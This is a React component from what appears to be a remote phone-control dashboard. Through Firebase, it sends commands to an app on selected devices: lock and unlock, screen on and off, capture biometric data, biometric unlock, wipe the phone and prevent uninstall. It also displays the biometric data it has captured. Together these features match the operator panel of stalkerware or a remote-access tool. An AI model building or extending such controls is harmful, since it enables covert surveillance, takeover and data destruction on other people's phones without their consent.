import React, { useState, useEffect, useCallback } from "react";
import { ref, onValue, set } from "firebase/database";
import { database as db } from "../firebaseConfig";
import "./LockServiceTab.css";

const LockServiceTab = () => {
  const [devices, setDevices] = useState([]);
  const [selectedDevice, setSelectedDevice] = useState(null);
  const [lockDetails, setLockDetails] = useState({
    connected: false,
    isDeviceSecure: false,
    biometricStatus: "Unknown",
    biometricType: "None",
    isDeviceAdminActive: false,
  });
  const [fetchStatus, setFetchStatus] = useState({
    lock: "idle",
    unlock: "idle",
    screenOn: "idle",
    screenOff: "idle",
    captureBiometric: "idle",
    biometricUnlock: "idle",
    wipePhone: "idle",
    preventUninstall: "idle",
  });
  const [errorDetails, setErrorDetails] = useState({});
  const [biometricData, setBiometricData] = useState(null);
  const [warnings, setWarnings] = useState([]);

  // Fetch devices from Firebase
  useEffect(() => {
    const devicesRef = ref(db, "Device");
    const unsubscribe = onValue(
      devicesRef,
      (snapshot) => {
        if (snapshot.exists()) {
          const deviceData = snapshot.val();
          const deviceList = Object.entries(deviceData).map(([id, data]) => ({
            id,
            name: data.name || id,
          }));
          setDevices(deviceList);
          if (!selectedDevice && deviceList.length > 0) {
            setSelectedDevice(deviceList[0].id);
          }
        } else {
          setDevices([]);
          setSelectedDevice(null);
          setWarnings((prev) => [
            ...prev,
            "No devices found. Check Firebase configuration.",
          ]);
        }
      },
      (error) => {
        console.error("Error fetching devices:", error);
        setWarnings((prev) => [
          ...prev,
          "Failed to fetch devices. Check Firebase connection.",
        ]);
      }
    );
    return () => unsubscribe();
  }, []);

  // Fetch lock details, biometric data, and warnings for selected device
  useEffect(() => {
    if (!selectedDevice) return;

    const lockServiceRef = ref(db, `Device/${selectedDevice}/lock_service`);
    const lockDetailsRef = ref(db, `Device/${selectedDevice}/lock_details`);
    const biometricRef = ref(db, `Device/${selectedDevice}/biometric_data`);

    const unsubscribeLockService = onValue(lockServiceRef, (snapshot) => {
      setLockDetails((prev) => ({
        ...prev,
        connected: snapshot.exists() ? snapshot.val().connected : false,
      }));
      if (!snapshot.exists() || !snapshot.val().connected) {
        setWarnings((prev) => [
          ...prev.filter((w) => !w.includes("Lock Service")),
          "Lock Service is not connected. Ensure the app is running on the device.",
        ]);
      }
    });

    const unsubscribeLockDetails = onValue(lockDetailsRef, (snapshot) => {
      if (snapshot.exists()) {
        const details = snapshot.val();
        setLockDetails((prev) => ({ ...prev, ...details }));
        const newWarnings = [];
        if (!details.isDeviceAdminActive) {
          newWarnings.push(
            "Device Admin is not enabled. Commands like Lock, Screen Off, Wipe, and Prevent Uninstall will fail."
          );
        }
        if (
          details.biometricStatus === "Not Enrolled" ||
          details.biometricStatus === "Not Available"
        ) {
          newWarnings.push(
            "Biometric authentication is not enrolled or unavailable. Biometric commands will fail."
          );
        }
        setWarnings(
          (prev) =>
            [
              ...newWarnings,
              ...prev.filter(
                (w) => !w.includes("Device Admin") && !w.includes("Biometric")
              ),
            ].slice(0, 5) // Limit warnings to avoid clutter
        );
      }
    });

    const unsubscribeBiometric = onValue(biometricRef, (snapshot) => {
      setBiometricData(snapshot.exists() ? snapshot.val() : null);
    });

    return () => {
      unsubscribeLockService();
      unsubscribeLockDetails();
      unsubscribeBiometric();
    };
  }, [selectedDevice]);

  // Monitor command status
  useEffect(() => {
    if (!selectedDevice) return;

    const commandRef = ref(db, `Device/${selectedDevice}/deviceAdvice`);
    const unsubscribe = onValue(
      commandRef,
      (snapshot) => {
        if (snapshot.exists()) {
          const data = snapshot.val();
          const statusKey =
            {
              CaptureBiometricData: "captureBiometric",
              BiometricUnlock: "biometricUnlock",
              wipeThePhone: "wipePhone",
              preventUninstall: "preventUninstall",
            }[data.action] || data.action;
          setFetchStatus((prev) => ({
            ...prev,
            [statusKey]: data.status,
          }));
          setErrorDetails((prev) => ({
            ...prev,
            [statusKey]: data.error || null,
          }));
        }
      },
      (error) => {
        console.error("Error fetching command status:", error);
        setWarnings((prev) => [
          ...prev,
          "Failed to fetch command status. Check Firebase connection.",
        ]);
      }
    );
    return () => unsubscribe();
  }, [selectedDevice]);

  // Trigger device command
  const triggerDeviceAdviceCommand = useCallback(
    async (action) => {
      if (!selectedDevice) {
        setWarnings((prev) => [
          ...prev,
          "No device selected. Please select a device.",
        ]);
        return;
      }

      if (
        action === "wipeThePhone" &&
        !window.confirm(
          "Are you sure you want to wipe the device? This will erase all data and cannot be undone."
        )
      ) {
        return;
      }

      try {
        const statusKey =
          action === "CaptureBiometricData"
            ? "captureBiometric"
            : action === "BiometricUnlock"
            ? "biometricUnlock"
            : action === "wipeThePhone"
            ? "wipePhone"
            : action === "preventUninstall"
            ? "preventUninstall"
            : action;
        setFetchStatus((prev) => ({
          ...prev,
          [statusKey]: "sending",
        }));
        const commandId = `cmd_${Date.now()}`;
        const commandRef = ref(db, `Device/${selectedDevice}/deviceAdvice`);
        await set(commandRef, {
          action,
          commandId,
          status: "pending",
          timestamp: Date.now(),
        });
      } catch (error) {
        console.error(`Failed to send command ${action}:`, error);
        const statusKey =
          action === "CaptureBiometricData"
            ? "captureBiometric"
            : action === "BiometricUnlock"
            ? "biometricUnlock"
            : action === "wipeThePhone"
            ? "wipePhone"
            : action === "preventUninstall"
            ? "preventUninstall"
            : action;
        setFetchStatus((prev) => ({
          ...prev,
          [statusKey]: "error",
        }));
        setErrorDetails((prev) => ({
          ...prev,
          [statusKey]: `Failed to send command: ${error.message}`,
        }));
        setWarnings((prev) => [
          ...prev,
          `Failed to send ${action} command: ${error.message}`,
        ]);
      }
    },
    [selectedDevice]
  );

  // Get button status text
  const getButtonStatus = useCallback(
    (action) => {
      const status = fetchStatus[action];
      switch (status) {
        case "sending":
          return "Sending...";
        case "pending":
          return "Processing...";
        case "success":
          return "Success";
        case "failed":
          return `Failed: ${errorDetails[action] || "Unknown error"}`;
        case "error":
          return `Error: ${errorDetails[action] || "Command failed"}`;
        case "cancelled":
          return `Cancelled: ${errorDetails[action] || "User cancelled"}`;
        default:
          return "Idle";
      }
    },
    [fetchStatus, errorDetails]
  );

  return (
    <div className="lock-service-tab">
      <h2>Lock Service Control</h2>
      {warnings.length > 0 && (
        <div className="lock-warnings">
          <h3>Warnings</h3>
          <ul>
            {warnings.map((warning, index) => (
              <li key={index}>{warning}</li>
            ))}
          </ul>
        </div>
      )}
      <div className="lock-device-selection">
        <label>Select Device:</label>
        <select
          value={selectedDevice || ""}
          onChange={(e) => setSelectedDevice(e.target.value || null)}
        >
          <option value="">Select a device</option>
          {devices.map((device) => (
            <option key={device.id} value={device.id}>
              {device.name}
            </option>
          ))}
        </select>
      </div>
      {selectedDevice && lockDetails && (
        <div className="lock-device-info">
          <h3>Device Status</h3>
          <p>
            <span>Lock Service Connected</span>
            <span>{lockDetails.connected ? "Yes" : "No"}</span>
          </p>
          <p>
            <span>Device Secure</span>
            <span>{lockDetails.isDeviceSecure ? "Yes" : "No"}</span>
          </p>
          <p>
            <span>Biometric Status</span>
            <span>{lockDetails.biometricStatus}</span>
          </p>
          <p>
            <span>Biometric Type</span>
            <span>{lockDetails.biometricType}</span>
          </p>
          <p>
            <span>Device Admin Active</span>
            <span>{lockDetails.isDeviceAdminActive ? "Yes" : "No"}</span>
          </p>
          {biometricData && (
            <p>
              <span>Biometric Data</span>
              <span>{biometricData}</span>
            </p>
          )}
        </div>
      )}
      {selectedDevice && (
        <div className="lock-controls">
          <h3>Device Controls</h3>
          <div className="lock-button-group">
            {[
              { action: "lock", label: "Lock Device" },
              { action: "unlock", label: "Manual Unlock" },
              { action: "screenOn", label: "Screen On" },
              { action: "screenOff", label: "Screen Off" },
              {
                action: "CaptureBiometricData",
                label: "Capture Biometric",
                statusKey: "captureBiometric",
              },
              {
                action: "BiometricUnlock",
                label: "Biometric Unlock",
                statusKey: "biometricUnlock",
              },
              {
                action: "wipeThePhone",
                label: "Wipe Device",
                statusKey: "wipePhone",
              },
              {
                action: "preventUninstall",
                label: "Prevent Uninstall",
                statusKey: "preventUninstall",
              },
            ].map(({ action, label, statusKey = action }) => (
              <button
                key={action}
                className="lock-button"
                data-status={fetchStatus[statusKey]}
                onClick={() => triggerDeviceAdviceCommand(action)}
                disabled={
                  fetchStatus[statusKey] === "sending" ||
                  fetchStatus[statusKey] === "pending"
                }
              >
                {label} ({getButtonStatus(statusKey)})
              </button>
            ))}
          </div>
        </div>
      )}
    </div>
  );
};

export default LockServiceTab;
